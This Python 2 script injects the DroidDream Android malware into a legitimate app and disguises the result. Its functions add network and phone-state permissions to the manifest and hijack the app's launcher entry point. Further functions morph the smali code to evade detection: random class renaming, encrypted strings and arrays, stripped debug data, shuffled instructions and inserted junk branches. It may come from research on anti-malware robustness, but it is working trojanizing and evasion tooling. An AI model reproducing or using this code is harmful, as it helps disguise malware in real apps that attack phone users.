#!/usr/bin/python

'''
    inject DroidDream possibly with code morphing into an app
    Assumption: the app has at least one launchable activity
'''
import pdb
import os

rpl = '/usr/local/bin/rpl' #when you run it from eclipse
# rpl = 'rpl' #on hpc or cli

def transformAndroidManifest(filename, mainact='com.android.root.main'):
    ''' inject the main activity and add the permissions '''
    PERM1 = 'android.permission.INTERNET'
    PERM2 = 'android.permission.READ_PHONE_STATE'
    PERM3 = 'android.permission.CHANGE_WIFI_STATE'
    PERM4 = 'android.permission.ACCESS_WIFI_STATE'
    hasp1 = hasp2 = hasp3 = hasp4 = False
    import xml.etree.ElementTree as etree
    etree.register_namespace('android',
            "http://schemas.android.com/apk/res/android")
    aname = '{http://schemas.android.com/apk/res/android}name'
    def parse_map(file):
        events = "start", "start-ns", "end-ns"
        root = None
        ns_map = []
        for event, elem in etree.iterparse(file, events):
            if event == "start-ns":
                ns_map.append(elem)
            elif event == "end-ns":
                ns_map.pop()
            elif event == "start":
                if root is None: 
                    root = elem 
                    elem.ns_map = dict(ns_map)
        return etree.ElementTree(root)
    tree = etree.parse(filename)
    manifest = tree.getroot()
    for perm in manifest.findall('uses-permission'):
        p = perm.get(aname)
        if p == PERM1: hasp1 = True
        if p == PERM2: hasp2 = True
        if p == PERM3: hasp3 = True
        if p == PERM4: hasp4 = True
    if not hasp1: etree.SubElement(manifest, 'uses-permission',
            attrib={aname:PERM1})
    if not hasp2: etree.SubElement(manifest, 'uses-permission',
            attrib={aname:PERM2})
    if not hasp3: etree.SubElement(manifest, 'uses-permission',
            attrib={aname:PERM3})
    if not hasp4: etree.SubElement(manifest, 'uses-permission',
            attrib={aname:PERM4})
    application = manifest.find('application')
    oldmain = None
    for activity in application.findall('activity'):
        intentfilter = activity.find('intent-filter')
        if intentfilter is None or not len(intentfilter):
            continue
        main = None
        launcher = None
        for action in intentfilter.findall('action'):
            if action.get(aname) == 'android.intent.action.MAIN':
                main = action
                break
        for cat in intentfilter.findall('category'):
            if cat.get(aname) == 'android.intent.category.LAUNCHER':
                launcher = cat
                break
        if main is not None and launcher is not None:
            intentfilter.remove(main)
            intentfilter.remove(launcher)
            if len(intentfilter) == 0:
                activity.remove(intentfilter)
            oldmain = activity
    mainactelem = etree.SubElement(application, 'activity',
            attrib={aname:mainact})
    ifilter = etree.SubElement(mainactelem, 'intent-filter')
    etree.SubElement(ifilter, 'action',
            attrib={aname:'android.intent.action.MAIN'})
    etree.SubElement(ifilter, 'category',
            attrib={aname:'android.intent.category.LAUNCHER'})
    #etree.dump(tree)
    tree.write(filename, encoding='utf-8', xml_declaration=True)
    return oldmain

#transformAndroidManifest('AndroidManifest.xml')


class RandomWord:
    def __init__(self, wordmap={}):
        self._cache=wordmap
    def __call__(self, word):
        if word in self._cache:
            return self._cache[word]
        import string
        import random
        r = None
        while not r or r in self._cache.keys() or r in self._cache.values():
            r = ''.join(random.choice(string.ascii_letters) for x in range(6))
        self._cache[word] = r
        return r

def renameclasses(topdir, main='com.android.root.main', keeptop=True):
    '''
        topdir is typically a dir such as smali/ or classes/.
        :param main:the main malware activity
        :param keeptop: If false, remove the top level dir when forming package names
        Assumption #1: the generated random string will not conflict with an
        original filename
        Assumption #2: assume smali or similar assembly language like jasmin
    '''
    w = open("output.txt","w");
    wordmap = {}
    originalclasses = set()
    randomword = RandomWord(wordmap)
    import subprocess, shlex
    old_dir = os.popen("pwd").read()[:-1]
    #print "** " + topdir
    os.chdir(topdir)
    topdir = "com";
    for root, dirs, files in os.walk(topdir, topdown=False):
        for name in dirs:
            os.rename(os.path.join(root, name), os.path.join(root,
                randomword(name))) # Assumption #1 applies here
            #print name, randomword(name)
            w.write(name + " " + randomword(name) + "\n")
        for name in files:
            lname, ext = name.rsplit('.', 1)
            if keeptop:
                package = root
            else:
                t = root.split('/', 1)
                if len(t) > 1:
                    package = t[1]
                else:
                    package = None
            if package is None:
                originalclasses.add(lname)
            else:
                originalclasses.add(package + '/' + lname)

            newname = '$'.join(part if part.isdigit() else randomword(part) for
                    part in lname.split('$')) # taking care of inner classes
            w.write(lname + " " + newname + "\n")
            #print lname, newname
            newname += '.' + ext # adding the extension back
            os.rename(os.path.join(root, name), os.path.join(root,
                newname)) # Assumption #1 applies here
    #print originalclasses
    import re
    classmap = {}
    for clazz in originalclasses:
        newclass = clazz
        for old, new in wordmap.iteritems():
            #print newclass, old, new
            newclass = re.sub(('\\b'+old+'\\b'), new, newclass)
        oldclass = 'L'+clazz+';'
        classmap[oldclass] = 'L'+newclass+';'
        #print oldclass, classmap[oldclass]
    for key, value in classmap.iteritems():
        #print "*** key=\""+key+"\""
        #print "*** value=\""+value+"\""
        #print "*** topdir=\""+topdir+"\""
        subprocess.check_call(shlex.split(rpl+' -Rd "%s" "%s" %s' % (key, value, topdir)))
        print
    os.chdir(old_dir)


#renameclasses('com')

def insertnops(fname):
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    insert = False
    for line in open(fname):
        if line.startswith('.method'):
            insert = True
        if line.startswith('.end method'):
            insert = False
        if insert:
            sl = line.strip()
            if not (sl == '' or sl.startswith('.') or sl.startswith(':')
                    or sl.startswith('move-result') or
                    sl.startswith('move-exception')) and line.find(sl) == 4:
                tmpf.write('    nop\n')
        tmpf.write(line)
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)

def insertnopsrecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            insertnops(fname)


#insertnopsrecursive('FOBkUD')

# copied from Skeet's java function
def applyCaesar(text, shift):
    ret = ''
    for i in text:
        c = ord(i)
        if (c >= 32 and c <= 127):
            x = c - 32
            x = (x + shift) % 96
            if x < 0:
                x += 96
            n = chr(x + 32)
            if n == '"':
                ret += '\\"'
            elif n == '\\':
                ret += '\\\\'
            else:
                ret += n
        else:
            ret += i
    return ret

#hello = 'hello world'
#print hello
#hello1 = applyCaesar(hello,1)
#print hello1
#print applyCaesar(hello1, -1)

def encStrings(fname):
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    for line in open(fname):
        if line.startswith('.field'):
            if ' final ' in line and ':Ljava/lang/String;' in line:
                tokens = line.strip().split('=', 1)
                if len(tokens) < 2:
                    continue # no exception required
                    raise Exception(line)
                sval = tokens[1][2:-1]
                written = True
                tmpf.write(tokens[0] + '= \"' + applyCaesar(sval, 1) + '\"\n')
                continue
        if line.strip().startswith('const-string'):
            tokens = line.strip().split(None, 2)
            if len(tokens) < 3:
                raise Exception(line)
            sval = tokens[2][1:-1]
            register = tokens[1][:-1]
            written = True
            tmpf.write('    ' + tokens[0] + ' ' + tokens[1]
                    + ' \"' + applyCaesar(sval, 1) + '\"\n')
            # range allows handling of registers greater than v16
            tmpf.write('    invoke-static/range {' + register + ' .. ' +register + '}, \
                Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;\n')
            tmpf.write('    move-result-object ' + register + '\n')
            continue
        tmpf.write(line)
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def encStringsRecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            print fname
            encStrings(fname)

#encStringsRecursive('com')

def encryptByte(b):
    if b[-1] != 't':
        raise Exception()
    i = int(b[:-1],16)
    if i < 0 or i > 255:
        raise Exception()
    return (hex(i ^ 0x3d) + 't')

def encArrays(fname):
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    inarray = False
    for line in open(fname):
        l = line.strip()
        if l.startswith('.end array-data'):
            inarray = False
        if inarray:
            bs = l.split()
            modbs = []
            for b in bs:
                modbs.append(encryptByte(b))
            tmpf.write('        ' + ' '.join(modbs) + '\n')
            continue
        if l.startswith('.array-data'):
            inarray = True
        if l.startswith('fill-array-data'):
            tmpf.write(line)
            tokens = l.split(None, 2)
            if len(tokens) < 3:
                raise Exception(line)
            register = tokens[1][:-1]
            tmpf.write('    invoke-static/range {' + register + ' .. ' +register + '}, \
                Lcom/EncryptArrays;->encrypt(Ljava/lang/Object;)V\n')
            continue
        tmpf.write(line)
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def encArraysRecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            print fname
            encArrays(fname)

#encArraysRecursive('com')

def remDebugInfo(fname):
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    for line in open(fname):
        l = line.strip()
        if (l.startswith('.source') or
                l.startswith('.parameter') or
                l.startswith('.local ') or
                l.startswith('.end local') or
                l.startswith('.restart local') or
                l.startswith('.line')):
            continue
        tmpf.write(line)
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def remDebugInfoRec(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            remDebugInfo(fname)

#remDebugInfoRec('com')

# what happens to interfaces - abstract handles that
def insertFuncIndirection(fname):
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    insert = False
    clazz = ''
    for line in open(fname):
        tmpf.write(line)
        static = False
        if line.startswith('.class'):
            clazz = (line.strip().rsplit(None,1))[1]
        if line.startswith('.method'):
            tokens = line.strip().split()
            if 'constructor' in tokens: continue
            if 'abstract' in tokens: continue
            desc = tokens[-1]
            idx = desc.find('(')
            methname = desc[:idx]
            numparam = 0
            idx += 1
            while desc[idx] != ')':
                isarray = False
                numparam += 1
                while desc[idx] == '[':
                    isarray = True
                    idx += 1
                if not isarray and (desc[idx] == 'J' or desc[idx] == 'D'):
                    numparam += 1
                if desc[idx] == 'L':
                    idx = desc.find(';', idx)
                idx += 1
            if 'static' not in tokens:
                numparam += 1 # the object itself
            rettype = desc[idx+1:]
            tmpf.write('    .registers %d\n'
                    % (numparam if rettype == 'V' else numparam + 1))
            # we can handle greater than five parameters
            if numparam > 5:
                tmpf.write('    invoke-%s/range {' % ('static' 
                    if 'static' in tokens else 'direct'))
                tmpf.write('p0 .. p%d' % (numparam - 1))
            else:
                tmpf.write('    invoke-%s {' % ('static' 
                    if 'static' in tokens else 'direct'))
                tmpf.write(','.join(['p%d' % x for x in range(numparam)]))
            tmpf.write('}, %s->x%s\n' % (clazz, desc))
            if rettype == 'J' or rettype == 'D':
                tmpf.write('    move-result-wide v0\n')
                tmpf.write('    return-wide v0\n')
            elif rettype.startswith('L') or rettype.startswith('['):
                tmpf.write('    move-result-object v0\n')
                tmpf.write('    return-object v0\n')
            elif rettype == 'V':
                tmpf.write('    return-void\n')
            else:
                tmpf.write('    move-result v0\n')
                tmpf.write('    return v0\n')
            tmpf.write('.end method\n\n')
            tokens[-1] = 'x' + tokens[-1]
            tmpf.write('.method private')
            for token in tokens[1:]:
                if (token != 'public' and
                        token != 'private' and
                        token != 'protected'):
                    tmpf.write(' ' + token)
            tmpf.write('\n')
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)

def insertFuncIndirectionRecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            insertFuncIndirection(fname)


#insertFuncIndirectionRecursive('hxbvgH')

def reorder(fname):
    print fname
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    keepwriting = True
    inmethod = False
    for line in open(fname):
        #print line
        l = line.strip()
        if l.startswith('.method') and l.find(' abstract ') < 0:
            #keepwriting = False
            inmethod = True
            tmpf.write(line) # write prologue here only
            insn = ''
            insns = []
            trylabels = []
            trystack = []
            tryends = dict()
            continue
        if inmethod and l != '' and l[0] != '.' and l[0] != '#' and not line.startswith(8*' '): #last one is to protect annotations
            keepwriting = False
        if inmethod and l == '.end method':
            if insn != '':
                insns.append(insn)
                insn = ''
            keepwriting = True
            inmethod = False
            from random import shuffle
            shuffled = zip(range(len(insns)), insns)
            #print trylabels
            def try_preserving_shuffle(b, e, s): # b*****m1*****m2*****e
                if e <= b: return
                #print s*' ', b, e, 
                m1 = m2 = -1
                z = None
                for (x, y) in trylabels:
                    if b > x: continue
                    if e < x: break
                    m1 = x
                    m2 = tryends[y]
                    z = (x, y)
                    break
                if z is not None:
                    trylabels.remove(z)                
                #print m1, m2
                #print shuffled[b]
                #print shuffled[e]
                #print shuffled[m1]
                #print shuffled[m2]
                if m1 == -1:
                    t = shuffled[b:e]
                    shuffle(t)
                    shuffled[b:e] = t
                    #print 1, [x for (x, y) in shuffled]
                    return
                if m1 > b: # v. important if b == 0
                    t1 = shuffled[b:m1-1]
                    shuffle(t1)
                    shuffled[b:m1-1] = t1
                try_preserving_shuffle(m1, m2, s+1)
                try_preserving_shuffle(m2+1, e, s+1)
                #print 2, [x for (x, y) in shuffled]
            try_preserving_shuffle(0, len(shuffled) - 1, 0)
            i = -1
            for index, insn in shuffled:
                if index != i + 1:
                    tmpf.write('\n    goto :insn_%d\n' % (i+1))
                i = index
                tmpf.write('\n    :insn_%d\n' % index)
                tmpf.write(insn)
            tmpf.write('\n    :insn_%d\n' % len(insns))
            tmpf.write('    nop\n')
        if keepwriting:
            tmpf.write(line)
            continue
        if l == '':
            if insn != '':
                insns.append(insn)
                insn = ''
            continue
        insn += line
        if l.startswith(':try_start_'):
            trylabels.append((len(insns), l[11:]))
            trystack.append(l[11:])
        if l.startswith(':try_end_'):
            tryends[trystack.pop()] = len(insns)
        #if not l.startswith('.') and not l.startswith(':'):
        #    insns.append(insn)
        #    insn = ''
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def reorderRecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            reorder(fname)

#reorderRecursive('smali')
#reorder('s.smali')

def nontrivialjunk(fname):
    import random, StringIO
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    index = 0
    regcount = 0
    branchid = 0
    def junk():
        r1 = 'v' + str(index)
        r2 = 'v' + str(index + 1)
        n1 = random.randrange(0, 15)
        n2 = random.randrange(1, 15)
        branch = ':junk_' + str(branchid)
        insns = ''
        insns += '    const/16 ' + r1 + ', ' + hex(n1) + '\n'
        insns += '    const/16 ' + r2 + ', ' + hex(n2) + '\n'
        insns += '    add-int ' + r1 + ', ' + r1 + ', ' + r2 + '\n'
        insns += '    add-int ' + r1 + ', ' + r1 + ', ' + r2 + '\n'
        insns += '    rem-int ' + r1 + ', ' + r1 + ', ' + r2 + '\n'
        insns += '    if-lez ' + r1 + ', ' + branch + '\n'
        return insns, branch
    numparam = 0
    keepwriting = True
    inmethod = False
    content = []
    branches = []
    for line in open(fname):
        l = line.strip()
        if line.startswith('.method') and l.find(' abstract ') < 0:
            inmethod = True
            tokens = line.strip().split()
            desc = tokens[-1]
            idx = desc.find('(')
            idx += 1
            while desc[idx] != ')':
                isarray = False
                numparam += 1
                while desc[idx] == '[':
                    isarray = True
                    idx += 1
                if not isarray and (desc[idx] == 'J' or desc[idx] == 'D'):
                    numparam += 1
                if desc[idx] == 'L':
                    idx = desc.find(';', idx)
                idx += 1
            if 'static' not in tokens:
                numparam += 1 # the object itself
            content = []
            dontjunk = '' # nonempty when to suspend inserting junk code
        if l.startswith('.locals') or l.startswith('.registers'):
            tokens = l.split()
            r = int(tokens[1])
            regcount = r
            if tokens[0] == '.locals':
                index = regcount
                regcount = regcount + numparam
            else:
                index = regcount - numparam
            if regcount + 2 < 16:
                tmpf.write('    ' + tokens[0] + ' ' + str(r + 2) + '\n')
            else:
                tmpf.write(line)
            continue
        if inmethod and l != '' and l[0] != '.' and l[0] != '#' and not line.startswith(8*' '): #last one is to protect annotations:
            keepwriting = False
            #tmpf.write(line) # write prologue here only
            #continue
        if inmethod and l == '.end method':
            keepwriting = True
            inmethod = False
            #content = strf.getvalue()
            #strf.close()
            numparam = 0
            index = 0
            regcount = 0
            branchid = 0
            codelines = content #.splitlines()
            branchlines = ['    ' + b + '\n    nop' for b in branches]
            random.shuffle(branchlines)
            for b in branchlines:
                codelines.insert(random.randrange(0, len(codelines)), b)
            branches = []
            tmpf.write('\n'.join(codelines))
            content = []
        if keepwriting:
            tmpf.write(line)
        else:
            if l.startswith(':array_'):
                dontjunk = '.end array-data'
            if l.startswith(':pswitch_data_'):
                dontjunk = '.end packed-switch'
            if l.startswith(':sswitch_data_'):
                dontjunk = '.end sparse-switch'
            if dontjunk == '' and not (l.startswith('move-result') or
                    l.startswith('move-exception')) and regcount < 16:
                insns, branch = junk()
                branchid += 1
                branches.append(branch)
                content.append(insns)
                content.append(line)
            elif content == []:
                content.append(line)
            else:
                content[-1] += line
            #if dontjunk != '':
            #    print line
            if l.startswith(dontjunk):
                dontjunk = ''
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def nontrivialjunkrecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            nontrivialjunk(fname)

#nontrivialjunkrecursive('smali')


def reverseorder(fname):
    print fname
    tmpfname = fname + '.tmp'
    f = open(fname)
    tmpf = open(tmpfname, 'w')
    keepwriting = True
    inmethod = False
    for line in open(fname):
        #print line
        l = line.strip()
        if l.startswith('.method') and l.find(' abstract ') < 0:
            #keepwriting = False
            inmethod = True
            tmpf.write(line) # write prologue here only
            insn = []
            insns = []
            trylabels = []
            trystack = []
            tryends = dict()
            continue
        if inmethod and l != '' and l[0] != '.' and l[0] != '#' and not line.startswith(8*' '): #last one is to protect annotations
            keepwriting = False
        if inmethod and l == '.end method':
            if insn != []:
                insns.append(insn)
                insn = []
            keepwriting = True
            inmethod = False

            insns = [[':i_'+str(i)]+insns[i]+['goto :i_'+str(i+1)] for i in
                        range(len(insns))]
            for beg, slabel in trylabels:
                end, elines = tryends[slabel]
                # beg and end lines will swap
                insns[beg] += elines
                insns[end] = [slabel] + insns[end]
            insns.reverse()
            pro = '    goto :i_0\n\n    '
            body = '\n\n    '.join(['\n    '.join(insn) for insn in insns])
            epi = '\n\n    :i_%d\n    nop\n' % len(insns)
            tmpf.write(pro)
            tmpf.write(body)
            tmpf.write(epi)

        if keepwriting:
            tmpf.write(line)
            continue
        if l == '':
            if insn != []:
                insns.append(insn)
                insn = []
            continue
        if l.startswith(':try_start_'):
            trylabels.append((len(insns), l))
            trystack.append(l)
        elif l.startswith(':try_end_'):
            tpop = trystack.pop()
            last = l
        elif l.startswith('.catch'):
            tryends[tpop] = (len(insns), [last, l])
        elif l.startswith('move-result'): #no goto before this; merge with prev
            previnsn = insns.pop()
            insn = previnsn + insn
            insn.append(l)
        else:
            insn.append(l)
    tmpf.close()
    f.close()
    os.rename(tmpfname, fname)


def reverseorderRecursive(topdir):
    for root, dirs, files in os.walk(topdir):
        for name in files:
            fname = os.path.join(root, name)
            reverseorder(fname)

